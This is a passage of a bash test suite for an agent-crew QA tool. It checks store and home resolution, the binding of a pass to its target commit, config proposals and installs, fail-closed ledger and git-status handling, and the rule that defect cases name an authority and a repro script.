assert_contains "$out" "given twice" "AC32(b): agent refuses a repeated selector too"

# AC32(d): agent's selectors reach the exact start command in the generated
# charter. A valid scoped pair resolves profile-ready, so the charter is
# produced; assert the verifier input instead of the adapter's source format.
write_map '- scope orchid = orchid-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam'
cat >"$scfg" <<'EOF'
qa:
  scopes:
    orchid:
      seed: "echo seed-orchid"
      apps:
        orchid-service:
          serve: "echo serve-orchid-service; sleep 30"
          health: "echo health-orchid-service"
EOF
AC_CREW_ID=sproj-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task ac32d --brief "$qa_brief" --evidence "$TMP/ac32d-ev" \
  --scope orchid --app orchid-service >/dev/null
charter_line="$(cat "$QA_BRIEF_CAPTURE")"
assert_contains "$charter_line" '--scope orchid' "the charter propagates --scope"
assert_contains "$charter_line" '--app orchid-service' "the charter propagates --app"
rm -f "$srecdir/sproj.md"
cd "$repo"

# --- knowledge store resolver ------------------------------------------------
# A profiled run reads only its frozen store snapshot.
sdir="$("$QA" store-dir)"
current_rd="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
assert_eq "$sdir" "$current_rd/profile/store" "profiled store resolves inside the consumed bundle"
assert_file "$sdir/manifest.json" "the frozen store always has a versioned manifest"
assert_eq "$("$QA" store-dir)" "$sdir" "store-dir is stable across calls"

# The AC_HOME-UNSET rung - the ONLY one a real qa pane ever lands on, and the
# one this file could not see: helpers.sh exports AC_HOME for every test, so
# the assertions above are true by construction and passed green against a
# store-dir that silently resolved into the checkout owning bin/. Hence `env -u`
# per invocation - the shape bbfb817 landed for gates that cannot fail.
#
# ...and those invocations run from a COPY of bin/ inside $TMP. With AC_HOME
# unset ac_home() ANSWERED ac_root() - the checkout that owns the bin/ being run
# - so every ac_{config,state,data}_dir call inside them did its mkdir -p
# THERE (ac_home refuses now; ac-qa.sh's own rung 3 still reaches ac_root). Run against the real $BIN they minted a config/ dir inside the live
# agent-crew checkout (start freezes the project config -> ac_config_dir).
# Same shape as tests/ac-pane-agent.test.sh's no-AC_HOME block; ac-qa.sh needs
# its sourced siblings alongside it.
fake="$TMP/fakecheckout"
mkdir -p "$fake/bin"
cp "$BIN/ac-qa.sh" "$BIN/ac-lib.sh" "$BIN/ac-harness.sh" "$BIN/ac-pipeline-lib.sh" "$BIN/ac-qa-lib.sh" "$BIN/ac-backend.sh" "$fake/bin/"
fake_qa="$fake/bin/ac-qa.sh"

# Zero-writes proof (ac-fleets.test.sh style), scoped to the three dirs this
# defect class can mint rather than all of $ROOT: the suite runs on dev boxes
# with a dirty tree and a churning .git, so a whole-root snapshot would be
# noisy, not stricter - config/, state/ and data/ ARE the complete surface
# ac_{config,state,data}_dir creates under ac_home().
snap_fleet_dirs() {
  local d
  for d in config state data; do
    printf -- '--- %s ---\n' "$d"
    if [ -e "$ROOT/$d" ]; then
      ( cd "$ROOT/$d" && find . | LC_ALL=C sort
        find . -type f -exec cksum {} \; 2>/dev/null | LC_ALL=C sort )
    else
      printf 'ABSENT\n'
    fi
  done
}
root_before="$(snap_fleet_dirs)"

probe="$(make_repo qa-store-probe)"
cd "$probe"
assert_fails env -u AC_HOME "$fake_qa" store-dir
# ...and the refusal MINTS NOTHING. The guard precedes the mkdir, so the wrong
# store is never created - the non-effect is the point: a refusal that littered
# the checkout would leave the very store the refusal exists to prevent.
assert_no_file "$fake/data/qa-store/qa-store-probe"

# Rung 1: a --store recorded at start WINS with no AC_HOME - the production
# path (the actor holding AC_HOME bakes it; the pane cannot derive it).
baked="$TMP/baked-store"
env -u AC_HOME "$fake_qa" start --target HEAD --task probe-qa --store "$baked" >/dev/null
assert_eq "$(env -u AC_HOME "$fake_qa" store-dir)" "$baked" "recorded --store wins with no AC_HOME"
[ -d "$baked/cases" ] || fail "store-dir must create cases/ under the recorded store"

# A RELATIVE --store is refused at start: it would resolve against the pane's
# disposable pool worktree, i.e. a store that evaporates - the disease, not the
# cure. Refused at start, so no run is minted around an unusable store.
assert_fails env -u AC_HOME "$fake_qa" start --target HEAD --task probe-qa --store rel/store

# A DANGLING current (a run dir reclaimed out-of-band) must not kill the OTHER
# rungs: readlink succeeds on a dangling link, so probing the symlink alone
# handed sed a missing run.meta and took the AC_HOME rung down with it.
rm -rf "$probe/.crew/qa/$(readlink "$probe/.crew/qa/current")"
assert_eq "$("$QA" store-dir)" "$AC_HOME/data/qa-store/qa-store-probe" "a dangling run falls through to the AC_HOME rung"

# ...and the whole AC_HOME-unset block left the live checkout byte-identical.
# This is the assertion that FAILS if the fixture ever runs the real $BIN again.
assert_eq "$(snap_fleet_dirs)" "$root_before" \
  "the AC_HOME-unset rung must mint nothing in the agent-crew checkout ($ROOT)"
# ...and it mints nothing in the FIXTURE home either: `start` freezes the
# project config through ac_project_config_file, which now resolves via ac_home
# (not ac_config_dir), so an unconfigured resolve no longer grows a stray
# config/ - the ac_config_read discipline extended to this producer. This
# asserts the stray-config mint the resolver used to leave is gone, so a
# reintroduced ac_config_dir mkdir reds here.
assert_no_file "$fake/config" "no AC_HOME: the resolver mints no stray config/ in the fixture (ac_home, not ac_config_dir)"

# --- the --home ladder: the SAME five doors ac-know.sh closes ----------------
# Same flag, same ladder, same guards, one shared resolver - two copies is how
# one site gets fixed and the other stays broken.
# Rung 3 is KEPT rather than refused, and it is now the ONE surviving path by
# which the distro checkout still becomes a home: ac_home itself refuses an
# unset AC_HOME rather than adopting it (ac-lib.sh, ac_home). Whether rung 3
# should refuse too is OPEN and routed to the captain, so this case pins what
# the code does TODAY, not a doctrine. What made rung 3 dangerous was
# invisibility, so the run PRINTS the home it used - ac-know.sh's answer.
mkdir -p "$fake/projects"
printf 'qa:
  serve: "echo default-fleet-serve"
' >"$fake/projects/qa-store-probe.yaml"
cd "$probe"
out="$(env -u AC_HOME "$fake_qa" start --target HEAD --task rung3 2>&1)"
assert_contains "$out" "notice: no fleet home named" "rung 3 announces the home it fell back to"
assert_contains "$out" "$fake" "the notice names the home it used"
assert_eq "$(env -u AC_HOME "$fake_qa" config qa.serve)" "echo default-fleet-serve" \
  "rung 3 still resolves the checkout's own config - its own ac_root call, untouched by ac_home's refusal"

# Rung 1 wins over rung 2, and the two guards fire before any run dir exists.
homed="$TMP/baked-home"
mkdir -p "$homed/projects"
printf 'qa:
  serve: "echo baked-home-serve"
' >"$homed/projects/qa-store-probe.yaml"
env -u AC_HOME "$fake_qa" start --target HEAD --task rung1 --home "$homed" >/dev/null
assert_eq "$(env -u AC_HOME "$fake_qa" config qa.serve)" "echo baked-home-serve" "--home is the single home resolution"
assert_fails env -u AC_HOME "$fake_qa" start --target HEAD --task bad --home rel/home
assert_fails env -u AC_HOME "$fake_qa" start --target HEAD --task bad --home "$probe"
mkdir -p "$probe/.crew/evil"
ln -s "$probe/.crew/evil" "$TMP/qa-evil-home"
assert_fails env -u AC_HOME "$fake_qa" start --target HEAD --task bad --home "$TMP/qa-evil-home"
# ...and the inverse that must NOT refuse: a fleet home contains its clones.
outerh="$TMP/qa-outer"
mkdir -p "$outerh/projects"
inner_repo="$(cd "$outerh/projects" && git init -q -b main inner && cd inner \
  && git config user.email t@t && git config user.name t \
  && printf 'x\n' >f.txt && git add -A && git commit -qm init && pwd -P)"
( cd "$inner_repo" && env -u AC_HOME "$fake_qa" start --target HEAD --task inner --home "$outerh" >/dev/null ) \
  || fail "a home that CONTAINS the repo is the normal fleet layout and must be accepted"
cd "$repo"

# --- target-checkout binding: the exercised HEAD must BE the --target commit --
# The pass marker is keyed by --target, so the checkout the cases exercise MUST
# be that commit - proven at start AND again before finish mints the pass, else
# commit A could mint a pass attestation for a run that actually tested commit B.
bindrepo="$(make_repo bind)"
# A run that records cases boots the deliverable, so this fixture project needs
# its own service contract in the fleet home.
printf 'qa:\n  serve: "echo bind-serve; sleep 30"\n  health: "true"\n  health_timeout: 5\n' \
  >"$AC_HOME/projects/bind.yaml"
printf 'v-A\n' >"$bindrepo/code.txt"
git -C "$bindrepo" add -A && git -C "$bindrepo" commit -qm A
sha_A="$(git -C "$bindrepo" rev-parse HEAD)"
printf 'v-B\n' >"$bindrepo/code.txt"
git -C "$bindrepo" add -A && git -C "$bindrepo" commit -qm B
sha_B="$(git -C "$bindrepo" rev-parse HEAD)"
cd "$bindrepo"

# (A) HEAD is at B; a run for A is REFUSED, names BOTH shas, and mints nothing.
assert_fails "$QA" start --target "$sha_A"
err="$("$QA" start --target "$sha_A" 2>&1 1>/dev/null || true)"
assert_contains "$err" "$sha_A" "the mismatch refusal names the requested target"
assert_contains "$err" "$sha_B" "the mismatch refusal names the actual HEAD"
assert_no_file "$bindrepo/.crew/qa/current" "a refused start mints no run"
assert_no_file "$bindrepo/.crew/qa/passed/$sha_A" "and no pass attestation for A"

# (B) Check out A: HEAD == --target -> start proceeds; a green run mints the
#     pass for A, and never for the commit it did not test.
git -C "$bindrepo" checkout -q "$sha_A"
"$QA" start --target "$sha_A" --task bind-ok >/dev/null
qa_case B-1 pass api --grade A >/dev/null
mk_png "$TMP/bind.png"
"$QA" visual "$TMP/bind.png" --case B-1 >/dev/null
prepare_pass
bind_env="$("$QA" finish passed)"
assert_no_file "$bindrepo/.crew/qa/passed/$sha_A" "an unprofiled exact-ref diagnostic does not mint a merge marker"
assert_contains "$bind_env" "QA_ATTESTATION_REASON=unprofiled" "the exact-ref diagnostic explains the absent marker"
assert_no_file "$bindrepo/.crew/qa/passed/$sha_B" "and never for a commit it did not test"

# (C) finish RE-PROVES the binding before minting: a HEAD that drifts mid-run
#     (checkout to B after start) cannot mint a pass for A.
"$QA" start --target "$sha_A" --task bind-drift >/dev/null
bdrd="$bindrepo/.crew/qa/$(readlink "$bindrepo/.crew/qa/current")"
qa_case B-2 pass api --grade A >/dev/null
"$QA" visual "$TMP/bind.png" --case B-2 >/dev/null
prepare_pass
git -C "$bindrepo" checkout -q "$sha_B"                 # HEAD drifts away from A
assert_fails "$QA" finish passed
assert_eq "$(sed -n 's/^outcome=//p' "$bdrd/run.meta")" "running" \
  "a drifted HEAD leaves the run running - no pass minted"
assert_no_file "$bindrepo/.crew/qa/passed/$sha_B" "and no attestation for the drifted-to commit"
git -C "$bindrepo" checkout -q "$sha_A"                 # back on target
"$QA" finish cancelled >/dev/null

# (D) A dirty TRACKED file is refused: the exercised code is no commit at all.
printf 'uncommitted edit\n' >>"$bindrepo/code.txt"
assert_fails "$QA" start --target "$sha_A"
err2="$("$QA" start --target "$sha_A" 2>&1 1>/dev/null || true)"
assert_contains "$err2" "code.txt" "the dirty refusal names the offending file"
git -C "$bindrepo" checkout -q -- code.txt              # clean it back

# (E) The sanctioned .crew/ ignore and untracked artifacts NEVER trip the guard.
mkdir -p "$bindrepo/.crew/pool" && printf 'junk\n' >"$bindrepo/.crew/pool/f"
printf 'brand new\n' >"$bindrepo/untracked.txt"
"$QA" start --target "$sha_A" --task bind-clean >/dev/null
assert_contains "$("$QA" status)" "target=$sha_A" \
  "untracked + .crew/ artifacts do not block a clean checkout"
"$QA" finish cancelled >/dev/null
rm -f "$bindrepo/untracked.txt"

# --- config-proposal: the config self-discovery renderer, HOME-targeted -------------
# The agent composes the FULL proposed config on stdin; the verb diffs it vs
# the resolved config into .crew/qa/ and instructs a cp into the fleet-home
# projects/<name>.yaml - the repo is never written, nothing proposed
# ever runs in this run.
proprepo="$(make_repo prop)"
cd "$proprepo" || fail "cd $proprepo"
out="$(printf 'qa:\n  serve: "npm start"\n  health: "curl -fsS localhost:3000/health"\n' \
  | "$QA" config-proposal --id prop-1)"
assert_file "$proprepo/.crew/config-proposals/prop-1/proposal.patch" "proposal diff written"
assert_file "$proprepo/.crew/config-proposals/prop-1/proposed.yaml" "proposed yaml kept alongside"
assert_contains "$out" "projects/prop.yaml" "instruction names the fleet-home install path"
assert_contains "$out" "config-install prop-1" "instruction pins the unique proposal id"
[ -z "$(git -C "$proprepo" status --porcelain -uno)" ] || fail "the repo working tree must stay untouched"
# An empty draft and a no-op draft both refuse.
assert_fails bash -c "printf '' | '$QA' config-proposal --id empty"
# config-install is the CHIEF-tier apply: staged draft -> home path, with a
# CONFIG-INSTALLED receipt line and a one-deep .prev veto net.
out="$("$QA" config-install prop-1)"
assert_contains "$out" "installed" "config-install applies the staged draft"
assert_contains "$out" "CONFIG-INSTALLED:" "install prints the room-receipt line for the chief"
assert_eq "$(cat "$AC_HOME/projects/prop.yaml")" \
  "$(cat "$proprepo/.crew/config-proposals/prop-1/proposed.yaml")" "home config == the reviewed draft"
if printf 'qa:\n  serve: "npm start"\n  health: "curl -fsS localhost:3000/health"\n' \
    | "$QA" config-proposal --id no-op >/dev/null 2>&1; then
  fail "a draft identical to the installed home config must refuse (nothing to propose)"
fi
# A second, different draft: install keeps the previous copy at .prev.
printf 'qa:\n  serve: "npm run start:v2"\n' | "$QA" config-proposal --id prop-2 >/dev/null
"$QA" config-install prop-2 >/dev/null
assert_contains "$(cat "$AC_HOME/projects/prop.yaml")" "start:v2" "re-install applies the new draft"
assert_contains "$(cat "$AC_HOME/projects/prop.yaml.prev")" "npm start" "previous config kept at .prev (captain veto net)"
# Two proposals from the same base never overwrite each other: the first
# install wins; the stale sibling fails its base-hash check.
printf 'qa:\n  serve: "race winner"\n' | "$QA" config-proposal --id race-a >/dev/null
printf 'qa:\n  serve: "race loser"\n' | "$QA" config-proposal --id race-b >/dev/null
"$QA" config-install race-a >/dev/null
assert_fails "$QA" config-install race-b
assert_contains "$(cat "$AC_HOME/projects/prop.yaml")" "race winner" "stale concurrent proposal cannot overwrite the winner"
assert_no_file "$AC_HOME/projects/prop.yaml.lock" "config install releases its project lock"
rm -f "$proprepo/.crew/config-proposals/prop-2/proposed.yaml"
assert_fails "$QA" config-install prop-2
printf 'qa:\n  serve: "npm start"\n  health: "curl -fsS localhost:3000/health"\n' >"$AC_HOME/projects/prop.yaml"
rm -f "$AC_HOME/projects/prop.yaml.prev"
# The home config is the only source: a qa start freezes it even when the repo
# contains a differently shaped project-local file.
printf 'qa:\n  serve: "legacy-serve"\n' >"$proprepo/.agent-crew.yaml"
git -C "$proprepo" add .agent-crew.yaml && git -C "$proprepo" commit -qm 'project-local config-shaped file'
"$QA" start --target "$(git -C "$proprepo" rev-parse HEAD)" --task home-cfg >/dev/null
assert_contains "$(cat "$proprepo/.crew/qa/$(readlink "$proprepo/.crew/qa/current")/config.yaml")" \
  "npm start" "the frozen run config is the HOME copy, not the project repo file"
"$QA" finish cancelled >/dev/null
rm -f "$AC_HOME/projects/prop.yaml"
# With the home config absent, the same project-local file is ignored and the
# run freezes an empty config instead of reviving a fallback.
"$QA" start --target "$(git -C "$proprepo" rev-parse HEAD)" --task no-home-cfg >/dev/null
rc=0; "$QA" config qa.serve >/dev/null 2>&1 || rc=$?
assert_eq "$rc" "1" "project-local config is ignored when no home config exists"
assert_eq "$(wc -c <"$proprepo/.crew/qa/$(readlink "$proprepo/.crew/qa/current")/config.yaml" | tr -d ' ')" "0" \
  "missing home config freezes an empty config"
"$QA" finish cancelled >/dev/null
cd "$repo" || fail "cd back from proprepo"

# --- the .crew/ exclude write is cosmetic housekeeping: DEGRADE, never abort ---
# cmd_start carried a byte-identical copy of ac-ship.sh's pre-fix
# ensure_crew_excluded. All it buys is `.crew/` staying out of `git status`, yet
# an unresolvable common dir, an uncreatable info/, or an unwritable exclude
# killed a whole qa run over an ignore line - AFTER `mkdir -p "$rd/logs"` had
# already minted the run dir.
xrepo="$(make_repo qaexclrepo)"
cd "$xrepo" || fail "cd qaexclrepo"
xcommon="$(git -C "$xrepo" rev-parse --path-format=absolute --git-common-dir)"
rm -rf "$xcommon/info"
: >"$xcommon/info"          # a FILE where info/ belongs: mkdir -p fails for any user
rc=0
out="$("$QA" start --target "$(git -C "$xrepo" rev-parse HEAD)" --task excl 2>&1)" || rc=$?
[ "$rc" -eq 0 ] || fail "qa start must survive an unwritable info/exclude, got rc=$rc: $out"
assert_contains "$out" "started qa run" "start completes despite the failed exclude write"
assert_contains "$out" "WARN" "the failed exclude write is reported, never swallowed"
"$QA" finish cancelled >/dev/null
# The FIRST step failing is the case that must not fall through: errexit is
# suppressed inside any non-final AND-OR element and a subshell INHERITS that
# suppression, so a bare sequence runs on with an empty $common - addressing
# /info/exclude at FILESYSTEM ROOT, which on a writable-root box (root,
# container, CI image) SUCCEEDS, exits 0, and never warns. The && chain
# short-circuits instead.
qagitstub="$TMP/qagitstub"; mkdir -p "$qagitstub"
qarealgit="$(command -v git)"
cat >"$qagitstub/git" <<EOF
#!/usr/bin/env bash
for a in "\$@"; do
  [ "\$a" = --git-common-dir ] && exit 1
done
exec "$qarealgit" "\$@"
EOF
chmod +x "$qagitstub/git"
crepo="$(make_repo qacommondirrepo)"
cd "$crepo" || fail "cd qacommondirrepo"
rc=0
out="$(PATH="$qagitstub:$PATH" "$QA" start --target "$(git -C "$crepo" rev-parse HEAD)" --task cdir 2>&1)" || rc=$?
[ "$rc" -eq 0 ] || fail "qa start must survive an unresolvable git common dir, got rc=$rc: $out"
assert_contains "$out" "started qa run" "start completes when the common dir cannot be resolved"
assert_contains "$out" "WARN" "an unresolvable common dir warns instead of silently falling through"
case "$out" in
  */info/exclude*|*"mkdir: /info"*)
    fail "a failed rev-parse must short-circuit, never address /info at filesystem root: $out" ;;
esac
assert_no_file "/info/exclude" "the fall-through never wrote outside the repo"
"$QA" finish cancelled >/dev/null
cd "$repo" || fail "cd back from qacommondirrepo"

# --- assert_target_checkout: a status that cannot be READ is not a clean tree ---
# `dirty="$(git status --porcelain -uno || true)"` made an ERRORED git status
# read as an empty string = CLEAN, on the very guard that binds a qa PASS to the
# commit it claims to have exercised - a broken status would let a run attest a
# pass against an unknown tree. Fail-closed like the HEAD resolve one line above.
dstub="$TMP/qadirtystub"; mkdir -p "$dstub"
drealgit="$(command -v git)"
cat >"$dstub/git" <<EOF
#!/usr/bin/env bash
for a in "\$@"; do
  [ "\$a" = status ] && exit 128
done
exec "$drealgit" "\$@"
EOF
chmod +x "$dstub/git"
drepo="$(make_repo qadirtyrepo)"
cd "$drepo" || fail "cd qadirtyrepo"
dsha="$(git -C "$drepo" rev-parse HEAD)"
rc=0
out="$(PATH="$dstub:$PATH" "$QA" start --target "$dsha" --task dirty-unreadable 2>&1)" || rc=$?
assert_eq "$rc" "1" "an unreadable git status ABORTS the target-checkout binding, never reads as CLEAN"
assert_contains "$out" "cannot read the worktree state" "the refusal names the unreadable status"
assert_no_file "$drepo/.crew/qa/current" "a refused start mints no run"
# Healthy path, same repo, same command, stub OUT of PATH: the guard only fires
# on the unreadable status - a clean tree still starts.
out="$("$QA" start --target "$dsha" --task dirty-readable 2>&1)"
assert_contains "$out" "started qa run" "a readable clean tree still starts"
"$QA" finish cancelled >/dev/null

# --- cmd_step: the ledger write is the state machine's truth, never swallowed ---
# `awk ... >"$tmp" && mv "$tmp" steps.tsv` is a non-final AND-OR element, which
# errexit EXEMPTS (and pipefail does not cover - it is not a pipeline). Unguarded,
# a failed write left the ledger unchanged, leaked the staged temp, and still
# printed `<step> -> <status>`. Mirrors the ac-ship.sh cmd_step fix.
lrepo="$(make_repo qaledgerrepo)"
cd "$lrepo" || fail "cd qaledgerrepo"
"$QA" start --target "$(git -C "$lrepo" rev-parse HEAD)" --task ledger >/dev/null
lrd="$lrepo/.crew/qa/$(readlink "$lrepo/.crew/qa/current")"
assert_contains "$("$QA" step pin running)" "pin -> running" "a readable ledger still transitions"
rm -f "$lrd/steps.tsv"                      # awk cannot read its input: the write fails
rc=0
out="$("$QA" step pin completed 2>&1)" || rc=$?
assert_eq "$rc" "1" "a failing ledger write ABORTS the step transition"
assert_contains "$out" "could not update the steps ledger" "step names the ledger refusal"
case "$out" in *"pin -> completed"*) fail "a failed ledger write must never report the transition: $out" ;; esac
"$QA" finish cancelled >/dev/null
cd "$repo" || fail "cd back from qaledgerrepo"

# --- F15: the case ledger rewrite must DIE on a failed rewrite, not swallow it
# with `|| true` - the same shape as the cmd_step fix just above, applied to
# the case ledger that owns every recorded verdict row.
f15repo="$(make_repo qaf15)"
cd "$f15repo" || fail "cd qaf15"
"$QA" start --target "$(git -C "$f15repo" rev-parse HEAD)" --task f15 >/dev/null
f15rd="$f15repo/.crew/qa/$(readlink "$f15repo/.crew/qa/current")"
ensure_default_testplan
"$QA" case F15-1 unverifiable --tier api --note 'seed row' >/dev/null
assert_eq "$(wc -l <"$f15rd/cases.tsv" | tr -d ' ')" "1" \
  "F15 seed row recorded before the rewrite is forced to fail"
rm -f "$f15rd/cases.tsv"    # awk cannot read its input: the case rewrite fails
rc=0
out="$("$QA" case F15-2 unverifiable --tier api --note 'forced rewrite failure' 2>&1)" || rc=$?
assert_eq "$rc" "1" "F15: a failing cases ledger rewrite ABORTS the case record"
assert_contains "$out" "cases ledger rewrite failed" \
  "F15: the refusal names the ledger rewrite failure"
: >"$f15rd/cases.tsv"    # restore the ledger the forced failure removed
"$QA" finish cancelled >/dev/null
cd "$repo" || fail "cd back from qaf15"

# --- F45: cmd_case rejects a tab/newline in --evidence AT RECORD TIME, the
# same up-front shape visual_register uses for its own path - unscrubbed, a
# tab/newline in $ev would land in the ledger row and only surface later as
# an opaque refusal at the finish gate.
f45repo="$(make_repo qaf45)"
cd "$f45repo" || fail "cd qaf45"
"$QA" start --target "$(git -C "$f45repo" rev-parse HEAD)" --task f45 >/dev/null
f45rd="$f45repo/.crew/qa/$(readlink "$f45repo/.crew/qa/current")"
ensure_default_testplan
out="$("$QA" case F45-1 unverifiable --tier api --evidence "$(printf 'a\tb')" 2>&1)" \
  && fail "F45: a tab in --evidence must be refused at record time"
assert_contains "$out" "--evidence must not contain a tab" \
  "F45: the refusal names the tab in --evidence"
assert_eq "$(wc -l <"$f45rd/cases.tsv" | tr -d ' ')" "0" \
  "F45: a refused --evidence writes no ledger row"
out="$("$QA" case F45-2 unverifiable --tier api --evidence "$(printf 'a\nb')" 2>&1)" \
  && fail "F45: a newline in --evidence must be refused at record time"
assert_contains "$out" "--evidence must not contain a newline" \
  "F45: the refusal names the newline in --evidence"
assert_eq "$(wc -l <"$f45rd/cases.tsv" | tr -d ' ')" "0" \
  "F45: a refused --evidence writes no ledger row (newline)"
"$QA" finish cancelled >/dev/null
cd "$repo" || fail "cd back from qaf45"

# --- F46 SOURCE-SHAPE drift-guard: NOT a behavior test -----------------------
# F46 routed two inline command-hash pipelines through qa_sha_string, and
# qa_sha_string's body is byte-identical to what it replaced - report.md's F46
# section says so, and this suite cannot black-box distinguish "calls
# qa_sha_string" from "still reimplements the same pipeline inline", so this
# guard does NOT prove hashing behavior. It only pins the SOURCE SHAPE: the
# inline pipeline `printf '%s' ... | shasum` must occur in bin/ac-qa.sh
# exactly once, inside qa_sha_string's own body - so a future re-inline of the
# hash (invisible to any behavioral test) still shows up here.
f46_hash_shape="printf '%s'.*shasum"
f46_total_hits="$(grep -c "$f46_hash_shape" "$BIN/ac-qa.sh")"
f46_body_hits="$(sed -n '/^qa_sha_string() {/,/^}/p' "$BIN/ac-qa.sh" | grep -c "$f46_hash_shape")"
assert_eq "$f46_total_hits" "1" \
  "F46 source-shape guard: bin/ac-qa.sh must contain exactly one inline string-hash pipeline (qa_sha_string's own) - proves no hashing behavior, only source shape"
assert_eq "$f46_body_hits" "1" \
  "F46 source-shape guard: the one surviving inline string-hash pipeline must live inside qa_sha_string's own body"

# --- FINDING AUTHORITY: a defect case names its authority and ships a repro ------
# T3. Asserting a DEFECT is the act that turns a statement into a fixer's work,
# so it is the act the contract binds: an expected behaviour with no named
# authority, or a reproduction that does not DECLARE what it held constant, is
# refused at the moment the case is written - the earliest divergence there is.
arepo="$(make_repo authrepo)"
printf 'qa:\n  serve: "echo auth-serve; sleep 30"\n  health: "true"\n  health_timeout: 5\n' \
  >"$AC_HOME/projects/authrepo.yaml"
cd "$arepo" || fail "cd authrepo"
"$QA" start --target "$(git -C "$arepo" rev-parse HEAD)" --task auth >/dev/null
ard="$arepo/.crew/qa/$(readlink "$arepo/.crew/qa/current")"
def() { "$QA" case TC-A fail --tier api --classification defect "$@"; }

assert_fails def
auth_err="$(def 2>&1 || true)"
assert_contains "$auth_err" "--authority" "the refusal names the missing authority"
assert_contains "$auth_err" "unverifiable --note" "the refusal names the alternative"
assert_fails def --authority '' --repro "$TMP/repro-ok.sh"   # empty == none
assert_fails def --authority '   ' --repro "$TMP/repro-ok.sh"
repro_err="$(def --authority 'docs/x.md:12' 2>&1 || true)"
assert_fails def --authority 'docs/x.md:12'                  # no --repro at all
assert_contains "$repro_err" "--repro" "the refusal names the missing reproduction"
assert_fails def --authority 'docs/x.md:12' --repro "$TMP/nope.sh"          # no such file
mk_repro "$TMP/repro-noexec.sh"; chmod -x "$TMP/repro-noexec.sh"
assert_fails def --authority 'docs/x.md:12' --repro "$TMP/repro-noexec.sh"  # not executable
printf '#!/usr/bin/env bash\n# HELD-CONSTANT: the id\nexit 1\n' >"$TMP/repro-nodisp.sh"
chmod +x "$TMP/repro-nodisp.sh"
assert_fails def --authority 'docs/x.md:12' --repro "$TMP/repro-nodisp.sh"  # no DISPUTED
printf '#!/usr/bin/env bash\n# DISPUTED: the event_type\nexit 1\n' >"$TMP/repro-noheld.sh"
chmod +x "$TMP/repro-noheld.sh"
assert_fails def --authority 'docs/x.md:12' --repro "$TMP/repro-noheld.sh"  # no HELD-CONSTANT
mk_repro "$TMP/repro-empty.sh" '' 'the id'
assert_fails def --authority 'docs/x.md:12' --repro "$TMP/repro-empty.sh"   # DISPUTED empty
mk_repro "$TMP/repro-empty2.sh" 'the event_type' ''
assert_fails def --authority 'docs/x.md:12' --repro "$TMP/repro-empty2.sh"  # HELD-CONSTANT empty
assert_eq "$(wc -l <"$ard/cases.tsv" | tr -d ' ')" "0" "a refused case writes no ledger row"

# Both present: accepted, and both land in the APPENDED columns ($9, $10), so
# every existing awk index keeps pointing at the field it always did.
qa_case TC-A fail api --classification defect \
  --authority 'docs/x.md:12 - the broker rejects a duplicate id' --repro "$TMP/repro-ok.sh" >/dev/null
assert_eq "$(awk -F'\t' '$1=="TC-A"{print $9}' "$ard/cases.tsv")" \
  "docs/x.md:12 - the broker rejects a duplicate id" "authority lands in column 9"
assert_eq "$(awk -F'\t' '$1=="TC-A"{print $10}' "$ard/cases.tsv")" "$TMP/repro-ok.sh" "repro lands in column 10"
assert_eq "$(awk -F'\t' '$1=="TC-A"{print $3}' "$ard/cases.tsv")" "fail" "the accepted case keeps its status"
# A tab or newline in the authority is scrubbed like the park's --note, for the
# same reason: the ledger rewrite must never run on a value that breaks its row.
qa_case TC-A fail api --classification defect \
  --authority "$(printf 'docs/x.md:12\tand\nmore')" --repro "$TMP/repro-ok.sh" >/dev/null
assert_eq "$(awk -F'\t' '$1=="TC-A"{print $9}' "$ard/cases.tsv")" "docs/x.md:12 and more" "authority lands scrubbed"
assert_eq "$(wc -l <"$ard/cases.tsv" | tr -d ' ')" "1" "no duplicate rows"

# The contract binds `fail --classification defect` ALONE (§8): parking with a
# reason, a non-defect classification, and a plain pass stay untouched.
"$QA" case TC-B unverifiable --tier api --note 'no broker sandbox' >/dev/null
qa_case TC-C fail api --classification flaky >/dev/null
qa_case TC-D pass api --grade A >/dev/null

# T5 - ledger BACK-COMPAT: an 8-column row written before this change renders in
# `status` and in the report table with `-` in the two new columns, and no awk
# field shifts under it.
printf 'LEGACY-1\tapi\tpass\t-\t0.9\tA\te/LEGACY-1\told note\n' >>"$ard/cases.tsv"
st="$("$QA" status)"
assert_contains "$st" "2 pass / 2 fail / 1 unverifiable" "status counts an 8-column legacy row"
"$QA" finish failed >/dev/null
arr="$("$QA" relay-report)"
assert_contains "$arr" "| LEGACY-1 | api | pass | - | A | e/LEGACY-1 | old note | - | - |" \
  "a pre-change row renders with - in both new columns"
assert_contains "$arr" "| TC-A | api | fail | defect |" "a new row still renders its original fields"
assert_contains "$arr" "docs/x.md:12 and more" "the report table carries the authority"
cd "$repo" || fail "cd back from authrepo"

# --- hardening: passing completion is a durable-state gate -------------------
hardrepo="$(make_repo qahard)"
mkdir -p "$AC_HOME/projects" "$AC_HOME/data/hard/qa/evidence"
cat >"$AC_HOME/projects/qahard.yaml" <<'EOF'
qa:
  serve: "sleep 30"
  health: "true"
  e2e:
    command: "true"
EOF
cd "$hardrepo" || fail "cd qahard"
"$QA" start --target HEAD --task hard --evidence "$AC_HOME/data/hard/qa/evidence" >/dev/null
hrd="$hardrepo/.crew/qa/$(readlink "$hardrepo/.crew/qa/current")"
hev="$(case_evidence H-WEB)"
qa_case H-WEB pass web --grade A --evidence "$hev" >/dev/null
mk_png "$TMP/hard.png"
"$QA" visual "$TMP/hard.png" --case H-WEB >/dev/null

# The pre-hardening implementation passed here with one case + one image.
out="$("$QA" finish passed 2>&1)" && fail "pending fixed steps must refuse a passing attestation: $out"
assert_contains "$out" "pending" "completion refusal names the non-terminal status"
assert_eq "$(sed -n 's/^outcome=//p' "$hrd/run.meta")" "running" \
  "a completion-gate refusal leaves the run active"
assert_no_file "$hardrepo/.crew/qa/passed/$(git -C "$hardrepo" rev-parse HEAD)" \
  "an incomplete pipeline writes no passing marker"

# One persistent skip grammar: start --skip is gone, and a skipped step needs
# a durable non-empty reason in column four.
assert_fails "$QA" start --target HEAD --skip e2e
assert_fails "$QA" step e2e skipped
"$QA" step e2e skipped --note 'no approved full-path case is needed' >/dev/null
assert_eq "$(awk -F'\t' '$1=="e2e"{print $4}' "$hrd/steps.tsv")" \
  "no approved full-path case is needed" "the skip reason is durable"

# Make every fixed step terminal, then prove unresolved findings still block.
stage_ship_receipt
terminalize_steps
printf '%s' '[{"id":"HF-1","severity":"warning","action":"ask-user",
               "description":"choose the accepted oracle"}]' \
  | "$QA" findings cases >/dev/null
